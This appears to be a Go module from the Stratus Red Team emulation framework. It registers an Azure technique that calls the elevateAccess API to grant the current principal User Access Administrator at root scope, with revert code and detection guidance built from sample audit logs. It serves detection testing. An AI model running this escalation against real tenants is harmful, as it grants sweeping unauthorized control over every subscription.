package azure

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"strings"

	"github.com/Azure/azure-sdk-for-go/sdk/azcore/policy"
	"github.com/Azure/azure-sdk-for-go/sdk/azcore/to"
	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/authorization/armauthorization/v2"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

// Built-in User Access Administrator role definition ID (constant across all tenants)
const userAccessAdminRoleDefinitionID = "18d7d88d-d35e-4fb5-a5c3-7773c20a72d9"

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "azure.privilege-escalation.root-user-access-administrator",
		FriendlyName: "Elevate to User Access Administrator at Root Scope",
		Platform:     stratus.Azure,
		MitreAttackTactics: []mitreattack.Tactic{
			mitreattack.PrivilegeEscalation,
		},
		Description: `
Elevates the current principal to the User Access Administrator role at root scope (/),
by abusing the "Access management for Azure resources" capability available to Global Administrators in Entra ID.

This technique allows a Global Administrator to gain control over all Azure subscriptions and management groups
in the tenant, enabling arbitrary role assignments across all Azure resources.

Warm-up: None

Detonation:

- Call the <code>elevateAccess</code> REST API endpoint, which assigns the User Access Administrator role at root scope (/) to the current principal

Revert:

- Remove the User Access Administrator role assignment at root scope (/)
If you are getting a 403 error when attempting to revert, you may need to refresh your credentials with <code>az login</code>

References:

- https://learn.microsoft.com/en-us/azure/role-based-access-control/elevate-access-global-admin
- https://microsoft.github.io/Azure-Threat-Research-Matrix/PrivilegeEscalation/AZT402/AZT402/
`,
		Detection: `
Identify when the <code>elevateAccess</code> action is called through either the Entra ID Audit Logs or the Azure Activity Log.

Sample Entra ID Audit Log entry:

` + codeBlock + `json hl_lines="1 3"
{
  "operationName": "User has elevated their access to User Access Administrator for their Azure Resources",
  "category": "AuditLogs",
  "properties": {
    "category": "AzureRBACRoleManagementElevateAccess",
    "activityDisplayName": "User has elevated their access to User Access Administrator for their Azure Resources",
    "loggedByService": "Azure RBAC (Elevated Access)",
    "result": "success",
    "initiatedBy": {
      "user": {
      "id": "00000000-0000-0000-0000-000000000000",
      "userPrincipalName": "user@example.com",
      "ipAddress": "1.2.3.4"
      }
    }
  }
}
  
` + codeBlock + `

Sample Azure Activity Log entry:

` + codeBlock + `json hl_lines="2 8"
{
  "authorization": {
    "action": "Microsoft.Authorization/elevateAccess/action",
    "scope": "/providers/Microsoft.Authorization"
  },
  "caller": "user@example.com",
  "operationName": {
    "value": "Microsoft.Authorization/elevateAccess/action",
    "localizedValue": "Assigns the caller to User Access Administrator role"
  },
  "properties": {
    "statusCode": "OK",
    "eventCategory": "Administrative",
    "entity": "/providers/Microsoft.Authorization",
    "message": "Microsoft.Authorization/elevateAccess/action",
  }
  "status": {
    "value": "Succeeded"
  }
}
` + codeBlock + `
`,
		IsIdempotent: false,
		Detonate:     detonate,
		Revert:       revert,
	})
}

func detonate(_ map[string]string, providers stratus.CloudProviders) error {
	ctx := context.Background()
	cred := providers.Azure().GetCredentials()
	clientOptions := providers.Azure().ClientOptions

	globalAdminClient, err := armauthorization.NewGlobalAdministratorClient(cred, clientOptions)
	if err != nil {
		return fmt.Errorf("failed to create global administrator client: %w", err)
	}

	log.Println("Elevating access to User Access Administrator at root scope (/)")
	_, err = globalAdminClient.ElevateAccess(ctx, nil)
	if err != nil {
		return fmt.Errorf("failed to call elevateAccess: %w", err)
	}

	log.Println("Successfully elevated access: User Access Administrator role assigned at root scope (/)")
	return nil
}

func revert(_ map[string]string, providers stratus.CloudProviders) error {
	ctx := context.Background()
	cred := providers.Azure().GetCredentials()
	clientOptions := providers.Azure().ClientOptions

	// Get a management token to extract the current principal's object ID
	token, err := cred.GetToken(ctx, policy.TokenRequestOptions{
		Scopes: []string{"https://management.azure.com/.default"},
	})
	if err != nil {
		return fmt.Errorf("failed to get access token: %w", err)
	}
	principalID, err := getOIDFromToken(token.Token)
	if err != nil {
		return fmt.Errorf("failed to extract principal object ID from access token: %w", err)
	}
	log.Println("Current principal object ID: " + principalID)

	roleAssignmentsClient, err := armauthorization.NewRoleAssignmentsClient("", cred, clientOptions)
	if err != nil {
		return fmt.Errorf("failed to create role assignments client: %w", err)
	}

	// List all role assignments at root scope and filter by principal ID and role definition ID
	log.Println("Listing role assignments at root scope (/) for principal " + principalID)
	pager := roleAssignmentsClient.NewListForScopePager("/", &armauthorization.RoleAssignmentsClientListForScopeOptions{
		Filter: to.Ptr("atScope()"),
	})

	for pager.More() {
		page, err := pager.NextPage(ctx)
		if err != nil {
			return fmt.Errorf("failed to list role assignments at root scope: %w", err)
		}
		for _, ra := range page.Value {
			if *ra.Properties.PrincipalID != principalID {
				continue
			}
			if !strings.HasSuffix(*ra.Properties.RoleDefinitionID, userAccessAdminRoleDefinitionID) {
				continue
			}
			log.Println("Found User Access Administrator role assignment at root scope, deleting it")
			_, err := roleAssignmentsClient.DeleteByID(ctx, *ra.ID, nil)
			if err != nil {
				return fmt.Errorf("failed to delete role assignment %s: %w", *ra.ID, err)
			}
			log.Println("Successfully removed User Access Administrator role assignment at root scope")
			return nil
		}
	}

	return fmt.Errorf("user access administrator role assignment at root scope not found")
}

func getOIDFromToken(tokenString string) (string, error) {
	parts := strings.Split(tokenString, ".")
	if len(parts) != 3 {
		return "", fmt.Errorf("invalid JWT token format: expected 3 parts, got %d", len(parts))
	}

	// JWT uses base64url encoding without padding - add padding as needed
	payload := parts[1]
	switch len(payload) % 4 {
	case 2:
		payload += "=="
	case 3:
		payload += "="
	}

	decoded, err := base64.URLEncoding.DecodeString(payload)
	if err != nil {
		return "", fmt.Errorf("failed to decode JWT payload: %w", err)
	}

	var claims struct {
		OID string `json:"oid"`
	}
	if err := json.Unmarshal(decoded, &claims); err != nil {
		return "", fmt.Errorf("failed to parse JWT claims: %w", err)
	}

	if claims.OID == "" {
		return "", fmt.Errorf("oid claim not found in JWT token")
	}

	return claims.OID, nil
}
